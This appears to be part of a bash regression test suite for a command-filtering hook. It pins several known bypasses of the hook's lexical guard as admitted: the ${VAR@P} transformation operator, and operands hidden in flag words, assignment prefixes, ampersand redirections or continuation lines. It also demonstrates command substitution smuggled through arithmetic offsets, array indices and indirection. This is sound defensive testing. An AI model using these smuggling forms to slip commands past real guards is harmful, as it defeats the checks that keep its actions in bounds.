xform_g6_pin() {
  xform_pin "$1" "$2" 0 rec 1
  xform_pair "${1%%:*}-PAIR-exit: through the copy whose G6 refuses, the same operand is refused" \
    "$XFORM_R" "$2" 0 rec 1   2 0 BLOCK-FS-BOUNDARY-003
  xform_pair "${1%%:*}-PAIR-rec: through the copy whose G6 writes no record, the same operand is admitted silently" \
    "$XFORM_S" "$2" 0 rec 1   0 0 -
}
# shellcheck disable=SC2016
xform_g6_pin "XFORM-OP-Q: \${VAR@Q} ADMITTED under G6 with one record (declared exclusion)" 'cat ${CFG@Q}'
# shellcheck disable=SC2016
xform_g6_pin "XFORM-OP-Z: \${VAR@Z}, a letter no shell assigns today, ADMITTED under G6 with one record (declared exclusion)" 'cat ${CFG@Z}'
# shellcheck disable=SC2016
xform_g6_pin "XFORM-PARAM-01: indexed element \${arr[0]@P} ADMITTED under G6 with one record (declared exclusion)" 'cat ${arr[0]@P}'
# shellcheck disable=SC2016
xform_g6_pin "XFORM-NEST-01: operator nested in a default word \${A:-\${B@P}} ADMITTED under G6 with one record (declared exclusion)" 'cat ${CFG:-${X@P}}'

# ----- XFORM-POS: words the token walk never hands to the cascade -----
# The cascade sees only the target operands extract_target_tokens emits for a listed verb.
# A flag-position word (it begins with `-`) is skipped there, and an assignment ahead of
# the verb is a prefix the canonicalizer separates from the verb's segment, so neither is
# examined whatever it carries. Pinned, with the walk's own mutation as the pairing, so a
# later change that examines either is a deliberate arm change.
# shellcheck disable=SC2016
XFORM_C_FLAG='cat -${CFG@P} /tmp/f'
xform_pin "XFORM-POS-01: the operator in a flag-position word is never examined — admitted, no record (declared exclusion)" \
  "$XFORM_C_FLAG" 0 rec 0
xform_pair "XFORM-POS-01-PAIR-rec: through the copy whose walk hands flag-position words over, the word is admitted under G6 with a record — POS-01's zero is the walk's" \
  "$XFORM_F" "$XFORM_C_FLAG" 0 rec 0   0 1 -
xform_pair "XFORM-POS-01-PAIR-exit: through that copy with G6 refusing, the same command is refused" \
  "$XFORM_FR" "$XFORM_C_FLAG" 0 rec 0   2 0 BLOCK-FS-BOUNDARY-003
# shellcheck disable=SC2016
XFORM_C_ASSIGN='X=${CFG@P} cat /tmp/f'
xform_pin "XFORM-POS-02: the operator in an assignment ahead of the verb is never examined — admitted, no record (declared exclusion)" \
  "$XFORM_C_ASSIGN" 0 rec 0
xform_pair "XFORM-POS-02-PAIR-rec: through the copy whose walk hands every word over, the assignment is admitted under G6 with a record — POS-02's zero is the walk's" \
  "$XFORM_W" "$XFORM_C_ASSIGN" 0 rec 0   0 1 -
xform_pair "XFORM-POS-02-PAIR-exit: through that copy with G6 refusing, the same command is refused" \
  "$XFORM_WR" "$XFORM_C_ASSIGN" 0 rec 0   2 0 BLOCK-FS-BOUNDARY-003
# Two operand positions of a listed verb, by the same walk. An ampersand inside a
# redirection operator ends the verb's segment: the walk splits on every `&`, and the
# canonicalizer starts a command after it. And the walk reads one physical line at a time,
# so an operand on a continuation line sits in a record of its own. Each is pinned at
# today's verdict, with the walk mutation that hands the word over as its pairing.
# shellcheck disable=SC2016
XFORM_C_AMPREDIR='cat 2>&1 ${CFG@P}'
xform_pin "XFORM-POS-03: the operator after a redirection operator that carries an ampersand is never examined — admitted, no record (declared exclusion)" \
  "$XFORM_C_AMPREDIR" 0 rec 0
xform_pair "XFORM-POS-03-PAIR-rec: through the copy whose walk keeps a redirection's ampersand in the verb's segment, the operand is admitted under G6 with a record — POS-03's zero is the walk's" \
  "$XFORM_A" "$XFORM_C_AMPREDIR" 0 rec 0   0 1 -
xform_pair "XFORM-POS-03-PAIR-exit: through that copy with G6 refusing, the same command is refused" \
  "$XFORM_AR" "$XFORM_C_AMPREDIR" 0 rec 0   2 0 BLOCK-FS-BOUNDARY-003
XFORM_C_CONT="cat \\${XFORM_NL}\${CFG@P}"
xform_pin "XFORM-POS-04: the operator on a continuation line is never examined — admitted, no record (declared exclusion)" \
  "$XFORM_C_CONT" 0 rec 0
xform_pair "XFORM-POS-04-PAIR-rec: through the copy whose walk joins a continuation line to the line it continues, the operand is admitted under G6 with a record — POS-04's zero is the walk's" \
  "$XFORM_L" "$XFORM_C_CONT" 0 rec 0   0 1 -
xform_pair "XFORM-POS-04-PAIR-exit: through that copy with G6 refusing, the same command is refused" \
  "$XFORM_LR" "$XFORM_C_CONT" 0 rec 0   2 0 BLOCK-FS-BOUNDARY-003

# ----- XFORM-NEAR: the named near misses stay allowed -----
# xform_near <label> <command> — a must-not-flag arm (exit 0) with its pairing arm: the
# copy whose G6 refuses must refuse it, so its zero refusals are read with G6 armed.
xform_near() {
  xform_pin "$1" "$2" 0 none
  xform_pair "${1%%:*}-PAIR-exit: through the copy whose G6 refuses, the same near miss is refused" \
    "$XFORM_R" "$2" 0 none -   2 0 BLOCK-FS-BOUNDARY-003
}
# shellcheck disable=SC2016
xform_near "XFORM-NEAR-01: a plain brace form \${VAR} — admitted" 'cat ${CFG}'
# shellcheck disable=SC2016
xform_near "XFORM-NEAR-02: a default value \${VAR:-x} — admitted" 'cat ${CFG:-x}'
# shellcheck disable=SC2016
xform_near "XFORM-NEAR-03: a quoted name with no brace — admitted" 'cat "$HOME/x"'

# ----- XFORM-RESID: what G2 cannot see at all -----
# An arithmetic context or an indirection re-evaluates ANOTHER variable's value, so a
# command substitution carried there runs although the operand shows no `$(`, no backtick
# and no operator. A lexical guard cannot refuse these without refusing ordinary
# substring, index and indirection forms. They are the reason the operator is declared
# rather than half-closed, and RESID-04 holds the "they execute" half of that reasoning
# against the interpreter in the same run.
# shellcheck disable=SC2016
xform_g6_pin "XFORM-RESID-01: arithmetic offset \${VAR:off} admitted under G6 with one record — declared limit" 'cat ${CFG:off}'
# shellcheck disable=SC2016
xform_g6_pin "XFORM-RESID-02: arithmetic index \${arr[idx]} admitted under G6 with one record — declared limit" 'cat ${arr[idx]}'
# shellcheck disable=SC2016
xform_g6_pin "XFORM-RESID-03: indirection \${!ref} admitted under G6 with one record — declared limit" 'cat ${!ref}'

# xform_runs: run a one-line program in a named interpreter and report whether it left a
# marker file. A side effect, not captured output, so a diagnostic cannot be mistaken for
# execution. H carries the text of a command substitution; a program that assigns it to
# a variable holds it as DATA until something re-evaluates that variable.
# shellcheck disable=SC2016  # program text for the child shell
XFORM_HIDDEN='$(/usr/bin/touch "$M/marker")'
xform_runs() {   # $1 = interpreter  $2 = program text -> CREATED | absent
  local xr_dir xr_out=absent
  xr_dir="$(/usr/bin/mktemp -d)"
  M="$xr_dir" H="$XFORM_HIDDEN" "$1" -c "$2" >/dev/null 2>&1 || true
  if [ -e "$xr_dir/marker" ]; then xr_out=CREATED; fi
  /bin/rm -rf "$xr_dir"
  /usr/bin/printf '%s' "$xr_out"
}
# shellcheck disable=SC2016  # program text for the child shell
xform_r_ctl="$(xform_runs /bin/bash ': $(/usr/bin/touch "$M/marker")')"
# shellcheck disable=SC2016
xform_r_spec="$(xform_runs /bin/bash 'CFG="$H"; : ${CFG}')"
# shellcheck disable=SC2016
xform_r_off="$(xform_runs /bin/bash 'off="a[$H]"; x=hello; : ${x:off}')"
# shellcheck disable=SC2016
xform_r_idx="$(xform_runs /bin/bash 'idx="a[$H]"; arr=(1 2 3); : ${arr[idx]}')"
# shellcheck disable=SC2016
xform_r_ind="$(xform_runs /bin/bash 'ref="a[$H]"; : ${!ref}')"
if [ "$xform_r_ctl" = CREATED ] && [ "$xform_r_spec" = absent ] \
   && [ "$xform_r_off" = CREATED ] && [ "$xform_r_idx" = CREATED ] && [ "$xform_r_ind" = CREATED ]; then
  /usr/bin/printf 'PASS: XFORM-RESID-04 the declared limit is real on this interpreter: offset, index and indirection each ran a command substitution carried in a value (control ran; a plain brace form did not)\n'
  PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: XFORM-RESID-04 the declared limit did not reproduce\n  control=%s (expected CREATED)  plain-brace=%s (expected absent)  offset=%s index=%s indirection=%s (each expected CREATED)\n' \
    "$xform_r_ctl" "$xform_r_spec" "$xform_r_off" "$xform_r_idx" "$xform_r_ind"
  FAIL=$((FAIL + 1))
fi
/usr/bin/printf 'RESIDUAL: XFORM arms pin the parameter-transformation operator, four positions the token walk never examines, and three value-re-evaluating expansion forms as ADMITTED. A green run here does not mean any of them is refused.\n'

# ----- XFORM-SEM-01: does the operator EXECUTE? (method b) -----
# Capability, not a version string: each candidate interpreter is asked whether it
# accepts the operator at all. The candidates are the five fixed locations the verb
# anchor already recognises — never a PATH lookup. Where none accepts it the whole
# demonstration is NOT-EVALUATED, and that line is emitted by a plain printf with no
# counter and no mode branch, so it can never read as a pass and can never gate.
xform_sem_bash=""
for xform_cand in /bin/bash /usr/bin/bash /usr/local/bin/bash /opt/homebrew/bin/bash /opt/local/bin/bash; do
  # shellcheck disable=SC2016  # program text for the child shell
  if [ -x "$xform_cand" ] && "$xform_cand" -c 'x=a; : "${x@P}"' >/dev/null 2>&1; then
    xform_sem_bash="$xform_cand"
    break
  fi
done
if [ -n "$xform_sem_bash" ]; then
  # shellcheck disable=SC2016
  xform_p_run="$(xform_runs "$xform_sem_bash" 'CFG="$H"; : ${CFG@P}')"
  # shellcheck disable=SC2016
  xform_p_ctl="$(xform_runs "$xform_sem_bash" ': $(/usr/bin/touch "$M/marker")')"
  # shellcheck disable=SC2016
  xform_p_spec="$(xform_runs "$xform_sem_bash" 'CFG="$H"; : ${CFG}')"
  # shellcheck disable=SC2016
  xform_p_ver="$("$xform_sem_bash" -c '/usr/bin/printf "%s" "$BASH_VERSION"' 2>/dev/null || echo unknown)"
  if [ "$xform_p_run" = CREATED ] && [ "$xform_p_ctl" = CREATED ] && [ "$xform_p_spec" = absent ]; then
    /usr/bin/printf 'PASS: XFORM-SEM-01 EVALUATED on %s (bash %s): the operator ran a command substitution carried in the value (control ran; a plain brace form did not)\n' "$xform_sem_bash" "$xform_p_ver"
    PASS=$((PASS + 1))
  else
    /usr/bin/printf 'FAIL: XFORM-SEM-01 EVALUATED on %s (bash %s): operator=%s (expected CREATED) control=%s (expected CREATED) plain-brace=%s (expected absent)\n' \
      "$xform_sem_bash" "$xform_p_ver" "$xform_p_run" "$xform_p_ctl" "$xform_p_spec"
    FAIL=$((FAIL + 1))
  fi
else
  /usr/bin/printf 'RESIDUAL: XFORM-SEM-01 NOT-EVALUATED - no bash at the five fixed locations accepts the parameter-transformation operator on this host, so the demonstration that it executes did not run; this is not a clean result. The lexical arms above do not depend on it.\n'
fi

# ----- XFORM-DOC: the readiness corpus and the hook agree, in the same run -----
# Same shape and same reason as MODEOFF-REC above: a claim in the document an operator
# reads before an enforce flip, held against the shipped hook's own verdict.
XFORM_EXPECT="ADMITTED-DECLARED"

xform_claim() {   # $1 = readiness file -> REFUSED-DECLARED | ADMITTED-DECLARED | BOTH-WAYS | STALE-CLAIM | NO-DISPOSITION | NO-VALUE-LIMIT | DOC-MISSING
  if [ ! -f "$1" ]; then /usr/bin/printf 'DOC-MISSING'; return 0; fi
  /usr/bin/awk '
    index($0, "is unambiguous — an unquoted")                             { stale = 1 }
    index($0, "Parameter-transformation operators are REFUSED at G2")     { ref = 1 }
    index($0, "Parameter-transformation operators are NOT refused at G2") { adm = 1 }
    index($0, "G2 does not see a value the shell re-evaluates")           { lim = 1 }
    END {
      if (stale == 1)           { printf "STALE-CLAIM";      exit }
      if (ref == 1 && adm == 1) { printf "BOTH-WAYS";        exit }
      if (ref != 1 && adm != 1) { printf "NO-DISPOSITION";   exit }
      if (lim != 1)             { printf "NO-VALUE-LIMIT";   exit }
      if (ref == 1)             { printf "REFUSED-DECLARED"; exit }
      printf "ADMITTED-DECLARED"
    }
  ' "$1"
}

xform_observe "$HOOK_DIR" "$XFORM_C_SUBJ"
case "$XO_EXIT" in
  2) xform_behaviour="REFUSED-DECLARED" ;;
  0) xform_behaviour="ADMITTED-DECLARED" ;;
  *) xform_behaviour="UNEXPECTED-EXIT" ;;
esac
xform_frag_claim="$(xform_claim "$MODEOFF_FRAG")"
xform_index_claim="$(xform_claim "$MODEOFF_INDEX")"

if [ "$xform_frag_claim" = "$XFORM_EXPECT" ] && [ "$xform_behaviour" = "$XFORM_EXPECT" ]; then
  /usr/bin/printf 'PASS: XFORM-DOC-01 readiness SOURCE and hook agree (doc=%s, hook=%s)\n' "$xform_frag_claim" "$xform_behaviour"
  PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: XFORM-DOC-01 readiness SOURCE and hook DISAGREE\n  doc=%s  hook=%s  (both expected %s)\n  file=%s\n' \
    "$xform_frag_claim" "$xform_behaviour" "$XFORM_EXPECT" "$MODEOFF_FRAG"
  FAIL=$((FAIL + 1))
fi

if [ "$xform_index_claim" = "$XFORM_EXPECT" ] && [ "$xform_behaviour" = "$XFORM_EXPECT" ]; then
  /usr/bin/printf 'PASS: XFORM-DOC-02 generated registry index carries the same disposition and the hook agrees\n'
  PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: XFORM-DOC-02 generated index claim=%s hook=%s (both expected %s) — regenerate with build-hook-registry.py\n  file=%s\n' \
    "$xform_index_claim" "$xform_behaviour" "$XFORM_EXPECT" "$MODEOFF_INDEX"
  FAIL=$((FAIL + 1))
fi

# One control per way the claim can go wrong. Each asserts the mutation is LIVE and that
# the classifier reports the specific code that mutation should produce.
xform_doc_control() {   # $1 = arm id  $2 = expected code  $3 = sed script
  local xc_mut xc_got
  xc_mut="$(/usr/bin/mktemp)"
  /usr/bin/sed "$3" "$MODEOFF_FRAG" > "$xc_mut"
  if /usr/bin/cmp -s "$MODEOFF_FRAG" "$xc_mut"; then
    /usr/bin/printf 'FAIL: %s mutation is INERT — mutant is byte-identical to the shipped document; re-point the sed\n' "$1"
    FAIL=$((FAIL + 1)); /bin/rm -f "$xc_mut"; return 0
  fi
  xc_got="$(xform_claim "$xc_mut")"
  /bin/rm -f "$xc_mut"
  if [ "$xc_got" = "$2" ]; then
    /usr/bin/printf 'PASS: %s mutation is live AND the classifier reports %s (control fires)\n' "$1" "$xc_got"
    PASS=$((PASS + 1))
  else
    /usr/bin/printf 'FAIL: %s classifier did not report the drift\n  expected=%s actual=%s\n' "$1" "$2" "$xc_got"
    FAIL=$((FAIL + 1))
  fi
}
# (a) the retired claim back in the text.
xform_doc_control "XFORM-DOC-03a" "STALE-CLAIM" \
  's|keeps its own glyphs|is unambiguous — an unquoted form keeps its own glyphs|'
# (b) the document saying the opposite of the hook.
xform_doc_control "XFORM-DOC-03b" "REFUSED-DECLARED" \
  's|operators are NOT refused at G2|operators are REFUSED at G2|'
# (c) the value limit softened into a coverage claim.
xform_doc_control "XFORM-DOC-03c" "NO-VALUE-LIMIT" \
  's|G2 does not see a value the shell re-evaluates|G2 reads every execution surface|'

# ----- XFORM-MUT-01: a pin on an allow must be able to go red -----
# Every G6 pin above asserts exit 0, which the shipped hook satisfies by construction. This
# arm is the class's own sensitivity control, kept beside the per-pin pairing arms: the copy
# whose G6 refuses must REFUSE the subject while the shipped hook still admits it. It is also
# the hook half of XFORM-DOC-01 and -02: the same payload, through the same copy.
xform_mut_live=0
if ! /usr/bin/cmp -s "$HOOK" "${XFORM_R}/block-fs-boundary.sh"; then xform_mut_live=1; fi
xform_observe "$XFORM_R" "$XFORM_C_SUBJ"
xform_mut_exit="$XO_EXIT"
xform_observe "$HOOK_DIR" "$XFORM_C_SUBJ"
xform_now_exit="$XO_EXIT"
if [ "$xform_mut_live" = 1 ] && [ "$xform_mut_exit" = 2 ] && [ "$xform_now_exit" = 0 ]; then
  /usr/bin/printf 'PASS: XFORM-MUT-01 refusing mutant is live and REFUSES the subject (exit 2) while the shipped hook admits it (exit 0): the pins can go red\n'
  PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: XFORM-MUT-01 mutant live=%s (expected 1)  mutant exit=%s (expected 2)  shipped exit=%s (expected 0)\n' \
    "$xform_mut_live" "$xform_mut_exit" "$xform_now_exit"
  FAIL=$((FAIL + 1))
fi
/bin/rm -rf "$XFORM_BASE"

# ----- Summary -----

echo ""
echo "================================"
TOTAL=$((PASS + FAIL))
/usr/bin/printf 'Total: %s  PASS: %s  FAIL: %s\n' "$TOTAL" "$PASS" "$FAIL"
echo "================================"

if [ "$FAIL" -gt 0 ]; then exit 1; fi
exit 0
